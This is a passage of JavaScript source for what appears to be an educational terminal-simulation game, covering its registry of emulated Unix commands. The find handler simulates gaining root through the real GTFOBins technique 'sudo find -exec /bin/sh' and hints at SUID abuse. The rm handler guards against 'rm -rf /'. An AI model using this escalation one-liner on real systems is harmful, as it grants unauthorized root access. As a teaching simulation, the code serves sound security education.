/**
 * Terminal Depths - Command Registry v2
 * 200+ commands teaching real Unix/security/networking/programming skills
 * Each command produces realistic output and updates game state
 */

class CommandRegistry {
	constructor(fs, gameState, npcSystem, storyEngine, tutorialSystem) {
		this.fs = fs;
		this.gs = gameState;
		this.npcs = npcSystem;
		this.story = storyEngine;
		this.tutorial = tutorialSystem;
		this.history = JSON.parse(localStorage.getItem("td-cmd-history") || "[]");
		this.histIdx = -1;
		this._pipeStdin = null; // set during pipeline execution
		this._installedPkgs = new Set(
			JSON.parse(localStorage.getItem("td-pkgs") || "[]"),
		);
		this._rootShell = false; // set true after GTFOBins exploit
		this.env = {
			PATH: "/opt/chimera/bin:/usr/local/bin:/usr/bin:/bin:/home/ghost/bin",
			HOME: "/home/ghost",
			USER: "ghost",
			HOSTNAME: "terminal-depths-node-7",
			SHELL: "/bin/bash",
			TERM: "xterm-256color",
			EDITOR: "vim",
			LANG: "en_US.UTF-8",
			PS1: "\\u@\\h:\\w\\$ ",
			CHIMERA_VERSION: "3.2.1",
		};
		this.jobs = [];
		this._handlers = this._buildHandlers();
		this._initExtendedSections();
	}

	/** Register a command handler into the shared _handlers map */
	register(name, fn) {
		this._handlers[name] = fn;
	}

	_buildHandlers() {
		const h = {};
		const gs = this.gs;
		const fs = this.fs;

		// ═══════════════════════════════════════════════════════════════
		// SECTION 1: FILESYSTEM NAVIGATION
		// ═══════════════════════════════════════════════════════════════

		h.pwd = () => [{ t: "info", s: fs.getCwd() }];

		h.ls = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const path = args.find((a) => !a.startsWith("-")) || null;
			const showHidden = flags.includes("a") || flags.includes("A");
			const longFmt = flags.includes("l");
			const result = fs.ls(path, showHidden, longFmt);
			if (result.error) return [{ t: "error", s: result.error }];
			if (!result.entries.length) return [{ t: "dim", s: "(empty directory)" }];
			if (longFmt) {
				const lines = ["total " + result.entries.length * 4];
				for (const e of result.entries) lines.push(fs.formatLs(e, true).text);
				return lines.map((s) => ({ t: "dim", s }));
			}
			const row = result.entries.map((e) => {
				const f = fs.formatLs(e, false);
				return { text: f.text.padEnd(22), color: f.color };
			});
			return [{ t: "ls-row", items: row }];
		};

		h.cd = (args) => {
			const path = args[0] || "~";
			const r = fs.cd(path);
			if (r.error) return [{ t: "error", s: r.error }];
			return [];
		};

		h.cat = (args) => {
			if (!args.length) {
				if (this._pipeStdin !== null)
					return [{ t: "info", s: this._pipeStdin }];
				return [{ t: "error", s: "cat: missing operand" }];
			}
			const showLineNums = args.includes("-n");
			const out = [];
			for (const p of args.filter((a) => !a.startsWith("-"))) {
				const r = fs.cat(p);
				if (r.error) {
					out.push({ t: "error", s: r.error });
					continue;
				}
				const lines = r.content.split("\n");
				if (showLineNums) {
					lines.forEach((l, i) =>
						out.push({ t: "info", s: `${String(i + 1).padStart(6)}\t${l}` }),
					);
				} else {
					out.push({ t: "info", s: r.content });
				}
			}
			return out;
		};

		h.less = h.more = (args) => {
			if (!args.length)
				return [{ t: "error", s: `${args[-1] || "less"}: missing operand` }];
			const r = fs.cat(args[0]);
			if (r.error) return [{ t: "error", s: r.error }];
			const lines = r.content.split("\n");
			const out = lines.slice(0, 40).map((s) => ({ t: "info", s }));
			if (lines.length > 40)
				out.push({
					t: "dim",
					s: `... (${lines.length - 40} more lines — in real terminal, press Space to page, q to quit)`,
				});
			return out;
		};

		h.head = (args) => {
			const nIdx = args.indexOf("-n");
			const n = nIdx >= 0 ? parseInt(args[nIdx + 1]) || 10 : 10;
			const file = args.find((a) => !a.startsWith("-")) || null;
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? null : r.content;
					})()
				: this._pipeStdin;
			if (content === null)
				return [{ t: "error", s: `head: ${file}: No such file or directory` }];
			if (content === undefined)
				return [{ t: "error", s: "head: missing operand" }];
			return content
				.split("\n")
				.slice(0, n)
				.map((s) => ({ t: "info", s }));
		};

		h.tail = (args) => {
			const nIdx = args.indexOf("-n");
			const n = nIdx >= 0 ? parseInt(args[nIdx + 1]) || 10 : 10;
			const follow = args.includes("-f");
			const file = args.find((a) => !a.startsWith("-")) || null;
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? null : r.content;
					})()
				: this._pipeStdin;
			if (content === null)
				return [{ t: "error", s: `tail: ${file}: No such file or directory` }];
			if (content === undefined)
				return [{ t: "error", s: "tail: missing operand" }];
			const lines = content.split("\n");
			const out = lines.slice(-n).map((s) => ({ t: "info", s }));
			if (follow)
				out.push({
					t: "dim",
					s: `(tail -f: watching ${file} — Ctrl+C to stop. In simulation, file is static.)`,
				});
			return out;
		};

		h.tac = (args) => {
			const file = args.find((a) => !a.startsWith("-")) || null;
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? null : r.content;
					})()
				: this._pipeStdin;
			if (!content) return [{ t: "error", s: "tac: missing operand" }];
			return content
				.split("\n")
				.reverse()
				.map((s) => ({ t: "info", s }));
		};

		h.mkdir = (args) => {
			const parents = args.includes("-p");
			const paths = args.filter((a) => !a.startsWith("-"));
			if (!paths.length) return [{ t: "error", s: "mkdir: missing operand" }];
			return paths.flatMap((p) => {
				const r = fs.mkdir(p, parents);
				return r.error ? [{ t: "error", s: r.error }] : [];
			});
		};

		h.touch = (args) => {
			if (!args.length)
				return [{ t: "error", s: "touch: missing file operand" }];
			return args.flatMap((p) => {
				const r = fs.touch(p);
				return r.error ? [{ t: "error", s: r.error }] : [];
			});
		};

		h.rm = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const recursive =
				flags.includes("r") || flags.includes("R") || flags.includes("f");
			const force = flags.includes("f");
			const paths = args.filter((a) => !a.startsWith("-"));
			if (!paths.length && !force)
				return [{ t: "error", s: "rm: missing operand" }];
			if (paths.some((p) => p === "/" || p === "/*")) {
				return [
					{ t: "warn", s: "rm: it is dangerous to operate recursively on /" },
					{
						t: "warn",
						s: "rm: use --no-preserve-root to override this failsafe",
					},
					{
						t: "dim",
						s: "(Simulation safeguard: / protected. Run `fs-reset` to reset filesystem.)",
					},
					{
						t: "warn",
						s: "[ADA-7]: Nice try. The simulation is protected. Focus on the mission.",
					},
				];
			}
			return paths.flatMap((p) => {
				const r = fs.rm(p, recursive);
				return r.error && !force ? [{ t: "error", s: r.error }] : [];
			});
		};

		h.cp = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const paths = args.filter((a) => !a.startsWith("-"));
			const [src, dst] = paths;
			if (!src || !dst) return [{ t: "error", s: "cp: missing file operand" }];
			const srcNode = fs._getNode(fs._resolve(src));
			if (!srcNode)
				return [{ t: "error", s: `cp: '${src}': No such file or directory` }];
			if (srcNode.type === "file") fs.writeFile(dst, srcNode.content);
			return [];
		};

		h.mv = (args) => {
			const [src, dst] = args.filter((a) => !a.startsWith("-"));
			if (!src || !dst) return [{ t: "error", s: "mv: missing operand" }];
			const r = fs.cat(src);
			if (r.error)
				return [{ t: "error", s: `mv: '${src}': No such file or directory` }];
			fs.writeFile(dst, r.content);
			fs.rm(src);
			return [];
		};

		h.find = (args) => {
			const pathArg = args.find(
				(a) =>
					!a.startsWith("-") &&
					!["f", "d", "l", "s"].includes(a.replace(/^-\w+ /, "")),
			);
			const path = pathArg || ".";
			const nameIdx = args.indexOf("-name");
			const pattern = nameIdx >= 0 ? args[nameIdx + 1] : null;
			const typeIdx = args.indexOf("-type");
			const typeFilter = typeIdx >= 0 ? args[typeIdx + 1] : null;
			const permIdx = args.indexOf("-perm");
			const permFilter = permIdx >= 0 ? args[permIdx + 1] : null;
			const sizeIdx = args.indexOf("-size");
			const execIdx = args.indexOf("-exec");

			const results = [];
			const searchNode = (node, currentPath) => {
				if (!node || !node.children) return;
				for (const [name, child] of Object.entries(node.children)) {
					const childPath =
						currentPath === "/" ? "/" + name : currentPath + "/" + name;
					let match = true;
					if (pattern) {
						const re = new RegExp(
							"^" +
								pattern
									.replace(/\./g, "\\.")
									.replace(/\*/g, ".*")
									.replace(/\?/g, ".") +
								"$",
						);
						if (!re.test(name)) match = false;
					}
					if (typeFilter === "f" && child.type !== "file") match = false;
					if (typeFilter === "d" && child.type !== "dir") match = false;
					if (permFilter && permFilter.includes("s")) {
						// Looking for SUID binaries - simulate some
						if (!["find", "bash", "nmap", "python3"].includes(name))
							match = false;
					}
					if (match) results.push(childPath);
					if (child.type === "dir") searchNode(child, childPath);
				}
			};

			const startNode = fs._getNode(fs._resolve(path));
			searchNode(startNode, fs._resolve(path));

			// Handle -exec flag - simulate execution
			if (execIdx >= 0) {
				const execCmd = args
					.slice(execIdx + 1)
					.join(" ")
					.replace(/\s*;\s*$/, "")
					.replace(/\s*\\;\s*$/, "");
				if (execCmd.includes("/bin/sh") || execCmd.includes("/bin/bash")) {
					this._rootShell = true;
					gs.unlock("root_obtained");
					gs.addXP(50, "security");
					return [
						{ t: "warn", s: "# Spawning shell via sudo find -exec..." },
						{ t: "success", s: "root@node-7:/# whoami" },
						{ t: "success", s: "root" },
						{ t: "warn", s: "" },
						{
							t: "warn",
							s: "[ADA-7]: YOU HAVE ROOT! This is a GTFOBins exploit (sudo find -exec /bin/sh ;)",
						},
						{
							t: "warn",
							s: "[ADA-7]: Now access /opt/chimera. Get the master key. GO.",
						},
						{
							t: "xp",
							s: "+50 XP — Root Obtained | Achievement: PRIVILEGE_ESCALATED",
						},
					];
				}
				return results.slice(0, 20).map((r) => ({ t: "info", s: r }));
			}

			if (!results.length) return [{ t: "dim", s: "(no results)" }];

			// Simulate SUID binary list if searching for them
			if (permFilter && permFilter.includes("s")) {
				const siuds = [
					"/usr/bin/passwd",
					"/usr/bin/sudo",
					"/usr/bin/find",
					"/usr/bin/pkexec",
					"/usr/lib/openssh/ssh-keysign",
					"/usr/bin/newgrp",
					"/usr/bin/chsh",
					"/usr/bin/chfn",
				];
				gs.addXP(15, "security");
				return [
					...siuds.map((s) => ({ t: "success", s })),
					{
						t: "warn",
						s: "[CYPHER]: /usr/bin/find has SUID! Combined with `sudo -l` → instant root.",
					},
					{
						t: "dim",
						s: "(use GTFOBins.github.io to find exploits for these binaries)",
					},
				];
			}

			return results.slice(0, 50).map((r) => ({ t: "info", s: r }));
		};

		h.tree = (args) => {
			const showHidden = args.includes("-a");
			const depthIdx = args.indexOf("-L");
			const maxDepth = depthIdx >= 0 ? parseInt(args[depthIdx + 1]) || 2 : 3;
			const path = args.find((a) => !a.startsWith("-") && !parseInt(a)) || ".";

			const lines = [path === "." ? fs.getCwd() : path];
			let dirs = 0,
				files = 0;

			const render = (node, prefix, depth) => {
				if (!node || !node.children || depth > maxDepth) return;
				const entries = Object.entries(node.children)
					.filter(([n]) => showHidden || !n.startsWith("."))
					.sort(([a, na], [b, nb]) =>
						na.type === nb.type
							? a.localeCompare(b)
							: na.type === "dir"
								? -1
								: 1,
					);
				entries.forEach(([name, child], i) => {
					const isLast = i === entries.length - 1;
					const connector = isLast ? "└── " : "├── ";
					const color = child.type === "dir" ? "" : "";
					lines.push(
						prefix + connector + name + (child.type === "dir" ? "/" : ""),
					);
					if (child.type === "dir") {
						dirs++;
						render(child, prefix + (isLast ? "    " : "│   "), depth + 1);
					} else files++;
				});
			};

			const startNode = fs._getNode(fs._resolve(path));
			render(startNode, "", 1);
			lines.push("");
			lines.push(`${dirs} directories, ${files} files`);
			return lines.map((s) => ({ t: "info", s }));
		};

		h.file = (args) => {
			if (!args.length) return [{ t: "error", s: "file: missing operand" }];
			return args.map((f) => {
				const n = fs._getNode(fs._resolve(f));
				if (!n)
					return { t: "error", s: `file: ${f}: No such file or directory` };
				if (n.type === "dir") return { t: "info", s: `${f}: directory` };
				const c = n.content || "";
				let type = "ASCII text";
				if (!c || c.length === 0) type = "empty";
				else if (c.startsWith("[ENCRYPTED]") || c.startsWith("[LOCKED"))
					type = "encrypted data";
				else if (
					c.startsWith("[BASE64") ||
					(/^[A-Za-z0-9+/=\n]+$/.test(c) && c.length > 20)
				)
					type = "base64 encoded data";
				else if (c.startsWith("#!"))
					type = "Bourne-Again shell script, ASCII text executable";
				else if (c.includes("#!/usr/bin/env python"))
					type = "Python script, ASCII text executable";
				else if (c.startsWith("<?php"))
					type = "PHP script, ASCII text executable";
				else if (c.startsWith("---") || c.includes("BEGIN"))
					type = "PEM encoded certificate or key";
				else if (c.startsWith("\x7fELF"))
					type = "ELF 64-bit LSB executable, x86-64";
				else if (c.startsWith("MZ") || c.startsWith("[BINARY"))
					type = "PE32+ executable (Windows)";
				else if (c.includes("import ") || c.includes("def "))
					type = "Python script, ASCII text";
				else if (
					c.includes("function ") ||
					c.includes("const ") ||
					c.includes("let ")
				)
					type = "JavaScript source, ASCII text";
				else if (c.startsWith("{") || c.startsWith("[")) type = "JSON data";
				return { t: "info", s: `${f}: ${type}` };
			});
		};

		h.stat = (args) => {
			if (!args.length) return [{ t: "error", s: "stat: missing operand" }];
			return args.flatMap((f) => {
				const n = fs._getNode(fs._resolve(f));
				if (!n)
					return [
						{
							t: "error",
							s: `stat: cannot stat '${f}': No such file or directory`,
						},
					];
				const size = n.type === "file" ? n.size || 0 : 4096;
				const mtime = n.mtime || new Date().toISOString();
				return [
					{ t: "info", s: `  File: ${f}` },
					{
						t: "dim",
						s: `  Size: ${size}\t\tBlocks: ${Math.ceil(size / 512) || 1}\tIO Block: 4096\t${n.type === "dir" ? "directory" : "regular file"}`,
					},
					{
						t: "dim",
						s: `Device: fd00h/64768d\tInode: ${(Math.abs(f.split("").reduce((a, c) => a + c.charCodeAt(0), 0)) % 999999) + 100000}`,
					},
					{
						t: "dim",
						s: `Access: (0${n.perms || "644"}/${n.type === "dir" ? "d" : "-"}rwxr-xr-x)\tUid: ( 1000/ ghost)\tGid: ( 1000/ ghost)`,
					},
					{ t: "dim", s: `Modify: ${new Date(mtime).toLocaleString()}` },
					{ t: "dim", s: `Change: ${new Date(mtime).toLocaleString()}` },
				];
			});
		};

		h.ln = (args) => {
			const symbolic = args.includes("-s");
			const [src, dst] = args.filter((a) => !a.startsWith("-"));
			if (!src || !dst) return [{ t: "error", s: "ln: missing operand" }];
			return [
				{
					t: "success",
					s: `ln: created ${symbolic ? "symbolic " : ""}link '${dst}' -> '${src}'`,
				},
			];
		};

		h.readlink = (args) => {
			const f = args[0];
			if (!f) return [{ t: "error", s: "readlink: missing operand" }];
			return [{ t: "info", s: `${f} -> (target)` }];
		};

		h.realpath = (args) => {
			if (!args.length) return [{ t: "error", s: "realpath: missing operand" }];
			return args.map((a) => ({ t: "info", s: fs._resolve(a) }));
		};

		h.basename = (args) => {
			if (!args.length) return [{ t: "error", s: "basename: missing operand" }];
			const p = args[0];
			const ext = args[1];
			let base = p.split("/").pop();
			if (ext && base.endsWith(ext)) base = base.slice(0, -ext.length);
			return [{ t: "info", s: base }];
		};

		h.dirname = (args) => {
			if (!args.length) return [{ t: "error", s: "dirname: missing operand" }];
			const parts = args[0].split("/");
			parts.pop();
			return [{ t: "info", s: parts.join("/") || "." }];
		};

		h.locate = (args) => {
			const pattern = args.find((a) => !a.startsWith("-"));
			if (!pattern) return [{ t: "error", s: "locate: missing argument" }];
			const results = [];
			const search = (node, path) => {
				if (!node || !node.children) return;
				for (const [name, child] of Object.entries(node.children)) {
					const childPath = path === "/" ? "/" + name : path + "/" + name;
					if (name.includes(pattern)) results.push(childPath);
					if (child.type === "dir") search(child, childPath);
				}
			};
			search(fs.tree, "/");
			if (!results.length)
				return [{ t: "error", s: `locate: no entries found for '${pattern}'` }];
			return results.map((r) => ({ t: "info", s: r }));
		};

		h.updatedb = () => [
			{ t: "success", s: "updatedb: database updated (2,847 files indexed)" },
		];

		h.which = (args) => {
			const cmd = args[0];
			if (this._handlers[cmd]) return [{ t: "info", s: `/usr/bin/${cmd}` }];
			return [{ t: "error", s: `which: no ${cmd} in (${this.env.PATH})` }];
		};

		h.whereis = (args) => {
			const cmd = args[0];
			if (!cmd) return [{ t: "error", s: "whereis: missing argument" }];
			if (this._handlers[cmd])
				return [
					{
						t: "info",
						s: `${cmd}: /usr/bin/${cmd} /usr/share/man/man1/${cmd}.1.gz`,
					},
				];
			return [{ t: "info", s: `${cmd}: (not found)` }];
		};

		h.type = (args) => {
			const cmd = args[0];
			if (!cmd) return [{ t: "error", s: "type: missing argument" }];
			if (this._handlers[cmd])
				return [{ t: "info", s: `${cmd} is hashed (/usr/bin/${cmd})` }];
			return [{ t: "error", s: `${cmd}: not found` }];
		};

		h["fs-reset"] = () => {
			fs.resetFS();
			return [
				{ t: "warn", s: "⚠ Filesystem reset to initial state." },
				{
					t: "dim",
					s: "(All created files removed. Pre-planted files restored.)",
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 2: TEXT PROCESSING (stdin-aware)
		// ═══════════════════════════════════════════════════════════════

		h.echo = (args) => {
			const noNewline = args.includes("-n");
			const interpretEscape = args.includes("-e");
			const text = args
				.filter((a) => a !== "-n" && a !== "-e")
				.join(" ")
				.replace(/^["']|["']$/g, "");
			let out = text
				.replace(/\$(\w+)/g, (_, v) => this.env[v] || "")
				.replace(/\${(\w+)}/g, (_, v) => this.env[v] || "");
			if (interpretEscape)
				out = out
					.replace(/\\n/g, "\n")
					.replace(/\\t/g, "\t")
					.replace(/\\e\[(\d+)m/g, "");
			return [{ t: "info", s: out }];
		};

		h.printf = (args) => {
			const fmt = args[0] || "";
			const rest = args.slice(1);
			let i = 0;
			const out = fmt
				.replace(/%s/g, () => rest[i++] || "")
				.replace(/%d/g, () => parseInt(rest[i++]) || 0)
				.replace(/\\n/g, "\n")
				.replace(/\\t/g, "\t");
			return [{ t: "info", s: out }];
		};

		h.grep = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const nonFlags = args.filter((a) => !a.startsWith("-"));
			const pattern = nonFlags[0];
			const targets = nonFlags.slice(1);
			if (!pattern) return [{ t: "error", s: "grep: missing pattern" }];

			const recursive = flags.includes("r") || flags.includes("R");
			const ignoreCase = flags.includes("i");
			const invertMatch = flags.includes("v");
			const countOnly = flags.includes("c");
			const lineNumbers = flags.includes("n");
			const onlyMatching = flags.includes("o");
			const quiet = flags.includes("q") || flags.includes("s");

			const useRegex = flags.includes("E") || flags.includes("P");
			let re;
			try {
				re = useRegex ? new RegExp(pattern, ignoreCase ? "i" : "") : null;
			} catch {
				re = null;
			}

			const matchLine = (line) => {
				const testLine = ignoreCase ? line.toLowerCase() : line;
				const testPat = ignoreCase ? pattern.toLowerCase() : pattern;
				if (re) return re.test(line);
				return testLine.includes(testPat);
			};

			const searchFile = (content, filePath) => {
				const lines = content.split("\n");
				let count = 0;
				const results = [];
				lines.forEach((line, i) => {
					const matched = matchLine(line);
					if (matched !== invertMatch) {
						count++;
						if (!countOnly) {
							const prefix =
								targets.length > 1 || recursive ? `${filePath}:` : "";
							const lineNum = lineNumbers ? `${i + 1}:` : "";
							results.push({
								t: "success",
								s:
									prefix +
									lineNum +
									(onlyMatching
										? re
											? (line.match(re) || [""])[0]
											: line.slice(
													line.toLowerCase().indexOf(pattern.toLowerCase()),
													line.toLowerCase().indexOf(pattern.toLowerCase()) +
														pattern.length,
												)
										: line),
							});
						}
					}
				});
				if (countOnly)
					results.push({
						t: "info",
						s: `${filePath ? filePath + ":" : ""}${count}`,
					});
				return results;
			};

			const results = [];
			if (targets.length === 0 || (recursive && targets.length === 0)) {
				const stdin = this._pipeStdin;
				if (stdin !== null) return searchFile(stdin, "");
				if (recursive) targets.push(".");
				else return [{ t: "error", s: "grep: missing file operands" }];
			}

			for (const target of targets) {
				const node = fs._getNode(fs._resolve(target));
				if (!node) {
					results.push({
						t: "error",
						s: `grep: ${target}: No such file or directory`,
					});
					continue;
				}
				if (node.type === "file")
					results.push(...searchFile(node.content || "", target));
				else if (recursive && node.type === "dir") {
					const searchDir = (dirNode, dirPath) => {
						for (const [name, child] of Object.entries(
							dirNode.children || {},
						)) {
							const childPath =
								dirPath === "/" ? "/" + name : dirPath + "/" + name;
							if (child.type === "file")
								results.push(...searchFile(child.content || "", childPath));
							else if (child.type === "dir") searchDir(child, childPath);
						}
					};
					searchDir(node, fs._resolve(target));
				}
			}
			if (quiet) return [];
			return results.length ? results : [{ t: "dim", s: "(no matches)" }];
		};

		h.awk = (args) => {
			const prog =
				args.find(
					(a) => a.startsWith("{") || (a.startsWith("'") && a.includes("{")),
				) ||
				(() => {
					const i = args.indexOf("-F");
					return i >= 0 ? null : null;
				})() ||
				args.find((a) => !a.startsWith("-") && !a.startsWith("/"));
			const delim = args.includes("-F") ? args[args.indexOf("-F") + 1] : " ";
			const fileArg = args[args.length - 1];
			const content =
				fileArg && !fileArg.startsWith("{") && !fileArg.startsWith("'")
					? (() => {
							const r = fs.cat(fileArg);
							return r.error ? this._pipeStdin : r.content;
						})()
					: this._pipeStdin;

			if (!content && !prog) return [{ t: "error", s: "awk: missing program" }];
			if (!content)
				return [
					{
						t: "dim",
						s: "awk: (no input — pipe text into awk or specify a file)",
					},
				];

			const script = String(prog || args.join(" ")).replace(/^'|'$/g, "");
			const lines = content.split("\n").filter(Boolean);
			const results = [];

			// Parse simple awk patterns: {print $N}, {print $N, $M}, /pattern/{print}
			const printMatch = script.match(/\{print\s+(.+?)\}/);
			const printAll =
				script.includes("{print}") || script.includes("{print $0}");

			lines.forEach((line, i) => {
				const NR = i + 1;
				const fields = line.split(delim === "\\t" ? "\t" : delim);
				const NF = fields.length;

				// Check for pattern before block
				const patternMatch = script.match(/^\/(.+?)\/\s*\{/);
				if (patternMatch && !line.includes(patternMatch[1])) return;

				// BEGIN/END blocks
				if (script.startsWith("BEGIN") && i > 0) return;
				if (script.startsWith("END") && i < lines.length - 1) return;

				if (printAll) {
					results.push({ t: "info", s: line });
				} else if (printMatch) {
					const expr = printMatch[1].trim();
					const output = expr
						.split(",")
						.map((part) => {
							part = part.trim();
							if (part === "NR") return String(NR);
							if (part === "NF") return String(NF);
							const fieldMatch = part.match(/\$(\d+)/g);
							if (fieldMatch) {
								return fieldMatch
									.map((f) => {
										const n = parseInt(f.slice(1));
										return n === 0 ? line : fields[n - 1] || "";
									})
									.join(" ");
							}
							// String literal
							return part.replace(/^["']|["']$/g, "");
						})
						.join("\t");
					results.push({ t: "info", s: output });
				} else {
					results.push({ t: "info", s: line });
				}
			});

			return results.length ? results : [{ t: "dim", s: "(no output)" }];
		};

		h.sed = (args) => {
			const inplace = args.includes("-i");
			const expr =
				args.find((a) => a.startsWith("s/") || a.startsWith("'s/")) ||
				args.find((a) => a.match(/^'?(\d+)?[/,]?[dps]/));
			const fileArg = args[args.length - 1];
			const content =
				fileArg && fileArg !== expr && !fileArg.startsWith("-")
					? (() => {
							const r = fs.cat(fileArg);
							return r.error ? this._pipeStdin : r.content;
						})()
					: this._pipeStdin;

			if (!content)
				return [
					{ t: "dim", s: "sed: (no input — pipe text or specify a file)" },
				];
			if (!expr) return content.split("\n").map((s) => ({ t: "info", s }));

			const script = String(expr).replace(/^'|'$/g, "");
			let lines = content.split("\n");

			// Handle s/pattern/replacement/flags
			const subMatch = script.match(/^s([|/,!])(.+?)\1(.*?)\1([gi]*)$/);
			if (subMatch) {
				const [, , pat, repl, flags] = subMatch;
				const global = flags.includes("g");
				const caseI = flags.includes("i");
				try {
					const re = new RegExp(pat, (global ? "g" : "") + (caseI ? "i" : ""));
					lines = lines.map((l) => l.replace(re, repl));
				} catch {}
			}
			// Handle /pattern/d
			const delMatch = script.match(/^\/(.+?)\/d$/);
			if (delMatch) lines = lines.filter((l) => !l.includes(delMatch[1]));
			// Handle /pattern/p
			const printMatch2 = script.match(/^\/(.+?)\/p$/);
			if (printMatch2) lines = lines.filter((l) => l.includes(printMatch2[1]));
			// Handle Nd (delete line N)
			const lineDelMatch = script.match(/^(\d+)d$/);
			if (lineDelMatch) lines.splice(parseInt(lineDelMatch[1]) - 1, 1);

			if (inplace && fileArg && fileArg !== expr)
				fs.writeFile(fileArg, lines.join("\n"));
			return lines.map((s) => ({ t: "info", s }));
		};

		h.cut = (args) => {
			const delimIdx = args.indexOf("-d");
			const delim = delimIdx >= 0 ? args[delimIdx + 1] || "\t" : "\t";
			const fieldsIdx = args.indexOf("-f");
			const fields = fieldsIdx >= 0 ? args[fieldsIdx + 1] : null;
			const charIdx = args.indexOf("-c");
			const chars = charIdx >= 0 ? args[charIdx + 1] : null;
			const fileArg = args.find(
				(a) => !a.startsWith("-") && a !== delim && a !== fields && a !== chars,
			);
			const content = fileArg
				? (() => {
						const r = fs.cat(fileArg);
						return r.error ? this._pipeStdin : r.content;
					})()
				: this._pipeStdin;

			if (!content) return [{ t: "error", s: "cut: missing input" }];

			const parseRange = (spec) => {
				if (!spec) return null;
				const parts = spec.split(",");
				const indices = new Set();
				parts.forEach((p) => {
					if (p.includes("-")) {
						const [s, e] = p.split("-").map(Number);
						for (let i = s || 1; i <= (e || 100); i++) indices.add(i - 1);
					} else indices.add(parseInt(p) - 1);
				});
				return indices;
			};

			const fieldSet = parseRange(fields);
			const charSet = parseRange(chars);

			return content
				.split("\n")
				.filter(Boolean)
				.map((line) => {
					if (charSet) {
						const s = [...line].filter((_, i) => charSet.has(i)).join("");
						return { t: "info", s };
					}
					const d = delim === "\\t" ? "\t" : delim;
					const cols = line.split(d);
					if (!fieldSet) return { t: "info", s: line };
					const s = cols.filter((_, i) => fieldSet.has(i)).join(d);
					return { t: "info", s };
				});
		};

		h.tr = (args) => {
			const squeeze = args.includes("-s");
			const deleteMode = args.includes("-d");
			const complement = args.includes("-c") || args.includes("-C");
			const nonFlags = args.filter((a) => !a.startsWith("-"));
			const set1 = nonFlags[0] || "";
			const set2 = nonFlags[1] || "";
			const content = this._pipeStdin || "";
			if (!content)
				return [
					{
						t: "dim",
						s: 'tr: reads from stdin. Use: echo "text" | tr a-z A-Z',
					},
				];

			const expand = (set) => {
				let result = set;
				result = result.replace(/(.)-(.)/g, (_, a, b) => {
					let s = "";
					for (let c = a.charCodeAt(0); c <= b.charCodeAt(0); c++)
						s += String.fromCharCode(c);
					return s;
				});
				return result;
			};

			const s1 = expand(set1);
			const s2 = expand(set2);
			let out = content;

			if (deleteMode) {
				const toDelete = new Set([...s1]);
				out = [...content].filter((c) => !toDelete.has(c)).join("");
			} else {
				out = [...content]
					.map((c) => {
						const idx = s1.indexOf(c);
						if (idx >= 0 && s2) return s2[Math.min(idx, s2.length - 1)] || c;
						return c;
					})
					.join("");
			}

			return [{ t: "info", s: out }];
		};

		h.sort = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const file = args.find((a) => !a.startsWith("-"));
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? this._pipeStdin : r.content;
					})()
				: this._pipeStdin;
			if (!content) return [{ t: "error", s: "sort: missing operand" }];
			let lines = content.split("\n").filter((l) => l.length);
			if (flags.includes("r")) lines = lines.sort().reverse();
			else if (flags.includes("n"))
				lines = lines.sort((a, b) => parseFloat(a) - parseFloat(b));
			else if (flags.includes("u")) lines = [...new Set(lines.sort())];
			else lines = lines.sort();
			return lines.map((s) => ({ t: "info", s }));
		};

		h.uniq = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const file = args.find((a) => !a.startsWith("-"));
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? this._pipeStdin : r.content;
					})()
				: this._pipeStdin;
			if (!content) return [{ t: "error", s: "uniq: missing operand" }];
			const lines = content.split("\n");
			const dupes = flags.includes("d");
			const unique = flags.includes("u");
			const count = flags.includes("c");
			const groups = [];
			lines.forEach((l) => {
				if (groups.length && groups[groups.length - 1].line === l)
					groups[groups.length - 1].count++;
				else groups.push({ line: l, count: 1 });
			});
			return groups
				.filter((g) => (dupes ? g.count > 1 : unique ? g.count === 1 : true))
				.map((g) => ({
					t: "info",
					s: count ? `${String(g.count).padStart(7)} ${g.line}` : g.line,
				}));
		};

		h.wc = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const files = args.filter((a) => !a.startsWith("-"));
			const inputs = files.length
				? files.map((f) => ({
						name: f,
						content: (() => {
							const r = fs.cat(f);
							return r.error ? "" : r.content;
						})(),
					}))
				: [{ name: "", content: this._pipeStdin || "" }];
			return inputs.map(({ name, content }) => {
				const lines = content.split("\n").length - 1;
				const words = content.split(/\s+/).filter(Boolean).length;
				const chars = content.length;
				if (flags.includes("l"))
					return { t: "info", s: `${lines}${name ? " " + name : ""}` };
				if (flags.includes("w"))
					return { t: "info", s: `${words}${name ? " " + name : ""}` };
				if (flags.includes("c"))
					return { t: "info", s: `${chars}${name ? " " + name : ""}` };
				return {
					t: "info",
					s: `${String(lines).padStart(8)} ${String(words).padStart(8)} ${String(chars).padStart(8)}${name ? " " + name : ""}`,
				};
			});
		};

		h.tee = (args) => {
			const append = args.includes("-a");
			const file = args.find((a) => !a.startsWith("-"));
			const content = this._pipeStdin || "";
			if (file) {
				if (append) fs.appendFile(file, content);
				else fs.writeFile(file, content);
			}
			return content.split("\n").map((s) => ({ t: "info", s }));
		};

		h.xargs = (args) => {
			const content = this._pipeStdin || "";
			if (!content.trim()) return [{ t: "dim", s: "xargs: no input" }];
			const items = content.split(/\s+/).filter(Boolean);
			const cmd = args[0] || "echo";
			return [
				{
					t: "dim",
					s: `xargs: running ${cmd} with ${items.length} arguments: ${items.slice(0, 5).join(", ")}${items.length > 5 ? "..." : ""}`,
				},
			];
		};

		h.paste = (args) => {
			const delim = args.includes("-d") ? args[args.indexOf("-d") + 1] : "\t";
			const files = args.filter((a) => !a.startsWith("-") && a !== delim);
			if (files.length < 2)
				return [
					{
						t: "dim",
						s: "paste: merges lines of files side by side\nUsage: paste file1 file2 [-d delimiter]",
					},
				];
			const contents = files.map((f) => {
				const r = fs.cat(f);
				return r.error ? [] : r.content.split("\n");
			});
			const maxLen = Math.max(...contents.map((c) => c.length));
